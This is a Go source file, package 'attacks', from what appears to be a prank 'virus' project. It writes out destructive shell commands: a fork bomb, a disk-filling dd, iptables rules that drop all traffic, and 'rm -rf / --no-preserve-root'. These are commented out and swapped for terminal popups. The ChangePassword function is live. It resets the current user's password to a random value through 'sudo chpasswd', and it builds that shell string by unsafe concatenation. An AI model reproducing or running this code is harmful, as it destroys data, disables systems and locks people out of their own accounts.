package attacks

import (
	"dnd-virus/password"
	"os/exec"
	"os/user"
)

func ForkBomb() error {
	//exec.Command("bash", "-c", ":(){ :|:& };:").Run()
	exec.Command("bash", "-c", "DISPLAY=:0 gnome-terminal -- bash -c 'echo Fork-bomb event; read'").Run()
	return nil
}

func FillDisk() error {
	//exec.Command("dd", "if=/dev/zero", "of=/tmp/bigfile", "bs=1M").Run()
	exec.Command("bash", "-c", "DISPLAY=:0 gnome-terminal -- bash -c 'echo Fill disk event; read'").Run()
	return nil
}

func BlockNetwork() error {
	//exec.Command("iptables", "-A", "OUTPUT", "-j", "DROP").Run()
	//exec.Command("iptables", "-A", "INPUT", "-j", "DROP").Run()
	exec.Command("bash", "-c", "DISPLAY=:0 gnome-terminal -- bash -c 'echo Block network event; read'").Run()
	return nil
}

func ChangePassword() error {
	currentUser, err := user.Current()
	if err != nil {
		return err
	}
	username := currentUser.Username
	newPass := password.GeneratePassword()
	exec.Command("sh", "-c", "echo '"+username+":"+newPass+"' | sudo chpasswd").Run()
	return nil
}

func CriticalFail() error {
	//exec.Command("bash", "-c", "sudo rm -rf / --no-preserve-root").Run()
	exec.Command("bash", "-c", "DISPLAY=:0 gnome-terminal -- bash -c 'echo Crash event; read'").Run()
	return nil
}

func GoodDay() error {
	exec.Command("bash", "-c", "DISPLAY=:0 gnome-terminal -- bash -c 'echo You are lucky; read'").Run()
	return nil
}
